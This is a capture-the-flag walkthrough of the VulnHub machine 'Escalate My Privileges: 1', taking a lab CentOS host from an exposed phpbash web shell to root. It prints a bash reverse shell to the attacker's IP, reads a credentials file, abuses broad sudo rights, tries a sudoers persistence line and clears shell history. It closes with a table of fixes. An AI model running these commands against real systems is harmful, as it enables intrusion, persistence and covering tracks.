# Escalate My Privileges: 1 — Walkthrough

**Target VM:** Escalate My Privileges: 1 ([VulnHub](https://www.vulnhub.com/entry/escalate-my-privileges-1,448/))
**Attacker:** Kali Linux — `192.168.0.145`
**Victim:** `192.168.0.64` (CentOS 7, hostname `my_privilege`)
**Goal:** Get a foothold on the target, escalate to root, and document the full chain.

This writeup follows the standard System Hacking methodology: Reconnaissance → Scanning → Gaining Access → Escalating Privileges → Maintaining Access → Clearing Tracks. All commands and output below are taken directly from my own lab run.

---

## Stage 1 — Reconnaissance

Confirmed my own IP on the lab network:

```bash
ifconfig
```

![ifconfig output](screenshots/01-attacker-ifconfig.png)

Attacker IP: `192.168.0.145`

Swept the subnet for live hosts with an ARP-based scan:

```bash
netdiscover
```

![netdiscover unique hosts](screenshots/02-netdiscover.png)

Then confirmed host liveness with an nmap ping sweep:

```bash
nmap -sn 192.168.0.0/24
```

![nmap host discovery](screenshots/03-nmap-host-discovery.png)

Filtering out the gateway, the VirtualBox NIC, and my own Kali box, the target was identified:

**Victim IP: `192.168.0.64`**

---

## Stage 2 — Scanning

Ran a full service/version scan against the target:

```bash
nmap -sC -sV -Pn -vv 192.168.0.64
```

![nmap scan starting](screenshots/04-nmap-scan-start.png)

![nmap open ports and scripts](screenshots/05-nmap-open-ports.png)

![nmap scan complete](screenshots/06-nmap-complete.png)

**Open ports / services:**

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 7.4 |
| 80/tcp | HTTP | Apache httpd 2.4.6 (CentOS), PHP 5.4.16 |
| 111/tcp | rpcbind | RPC #100000 |
| 2049/tcp | nfs_acl | NFS |

The `http-robots.txt` NSE script flagged a disallowed entry:

```
|_http-robots.txt: 1 disallowed entry
|_/phpbash.php
|_http-title: Check your Privilege
```

`/phpbash.php` stood out immediately as a web shell left exposed on the server.

---

## Stage 3 — Gaining Access

Browsing to `http://192.168.0.64/phpbash.php` dropped straight into an interactive web shell running as the low-privileged `apache` user.

From the web shell, sent a reverse shell back to a Kali listener:

```bash
# on Kali
nc -nlvp 4444

# in the phpbash shell
bash -i >& /dev/tcp/192.168.0.145/4444 0>&1
```

![sending the reverse shell from phpbash](screenshots/07-phpbash-reverse-shell-sent.png)

The listener caught the callback:

```bash
whoami      # apache
id          # uid=48(apache) gid=48(apache) groups=48(apache)
```

![reverse shell caught, enumerating /home](screenshots/08-reverse-shell-caught.png)

Enumerating `/home` turned up a world-writable `armour` directory (`drwxrwxrwx`) containing a credentials file:

```bash
cat /home/armour/Credentials.txt
```

![Credentials.txt contents](screenshots/09-credentials-file.png)

```
my password is
md5(rootroot1)
```

This is a hint, not a plaintext password — `armour`'s actual password is the **MD5 hash of the string `rootroot1`**.

---

## Stage 4 — Escalating Privileges

### 4.1 Derive armour's password

```bash
echo -n 'rootroot1' | md5sum
# b7bc8489abe360486b4b19dbc242e885
```

### 4.2 Switch to the armour user

```bash
su armour
# Password: b7bc8489abe360486b4b19dbc242e885
id
# uid=1000(armour) gid=1000(armour) groups=1000(armour),31(exim)
```

The shell had no job control (no proper TTY), which blocks `sudo`, so a TTY was allocated with:

```bash
SHELL=/bin/bash script -q /dev/null
```

![su to armour, requesting a TTY, sudo -l](screenshots/10-su-armour-sudo-l.png)

### 4.3 Check sudo rights

```bash
sudo -l
```

`armour` turned out to have **passwordless (`NOPASSWD`) sudo rights over a huge list of binaries** — shells, interpreters, editors, and a pile of classic GTFOBins entries (`/bin/bash`, `/bin/sh`, `vim`, `python`, `perl`, `find`, `nmap`, `cpan`, etc.):

![full sudo -l binary list](screenshots/11-sudo-l-full-list.png)

### 4.4 Get root

First attempt: write a persistence line straight into `/etc/sudoers` via a script:

```bash
echo "echo 'armour ALL=(ALL)NOPASSWD:ALL'>> /etc/sudoers" > backup.sh
sh backup.sh
# backup.sh: line 1: /etc/sudoers: Permission denied
```

That failed, since the script itself wasn't run with elevated rights. Pivoting to the `sudo` rights directly:

```bash
sudo su
```

![root shell obtained](screenshots/12-root-shell.png)

```
[root@my_privilege armour]#
```

**Root access achieved.**

---

## Stage 5 — Clearing Tracks

Cleared shell history before logging out:

```bash
history -c
```

![clearing bash history](screenshots/13-clearing-tracks.png)

In a real (authorized) engagement, an attacker would also consider clearing or truncating `/var/log/secure` and `/var/log/auth.log`, and timestomping modified files — noted here for completeness, not performed, since logs should be preserved for lab review.

---

## Attack Chain (at a glance)

```
Recon (netdiscover + nmap -sn)
   └─> Victim: 192.168.0.64
Scanning (nmap -sC -sV)
   └─> Port 80 open, /phpbash.php disclosed via robots.txt
Gaining Access (phpbash web shell)
   └─> Shell as apache
   └─> /home/armour world-writable (777) → Credentials.txt → md5(rootroot1)
Escalating (reverse shell → su armour → sudo -l → sudo su)
   └─> apache → armour (derived MD5 password) → root
Clearing Tracks (history -c)
```

---

## Root Causes & Fixes

| Weakness | Fix |
|---|---|
| Web shell (`phpbash.php`) left on the web server | Remove dev/debug tooling before deployment; file integrity monitoring |
| `robots.txt` disclosed a sensitive path | Never rely on `robots.txt` for access control — it's public by design |
| `/home/armour` was world-writable (`777`) | Apply least-privilege permissions (`700`) on home directories |
| Plaintext password hint stored on disk | Never store credentials or hints to them in readable files |
| Weak, unsalted MD5 password | Use a slow, salted hash (bcrypt/argon2) and enforce password strength |
| `sudo NOPASSWD` on shell-capable/GTFOBins binaries | Restrict `sudo` grants to specific, non-escapable commands; audit the sudoers file against [GTFOBins](https://gtfobins.github.io) |
| No alerting on reverse shells or sudoers changes | Deploy host-based IDS/EDR and alert on suspicious outbound connections and privilege changes |

---

## Tools Used

- `netdiscover` — ARP-based host discovery
- `nmap` — port scanning and service/version detection
- `phpbash.php` — exposed web shell (initial access vector)
- `netcat` — reverse shell listener
- `md5sum` — password hash derivation
- `su` / `sudo` — privilege escalation
- [GTFOBins](https://gtfobins.github.io) — reference for abusing sudo-permitted binaries

---

## Conclusion

The box went from an unauthenticated network position to full root access by chaining four individually small issues: an exposed web shell, an overly permissive home directory, a weak credential scheme, and a dangerously broad `sudo` configuration. None of these alone would be catastrophic — together they formed a complete path to root, which is the usual story with real-world privilege escalation.
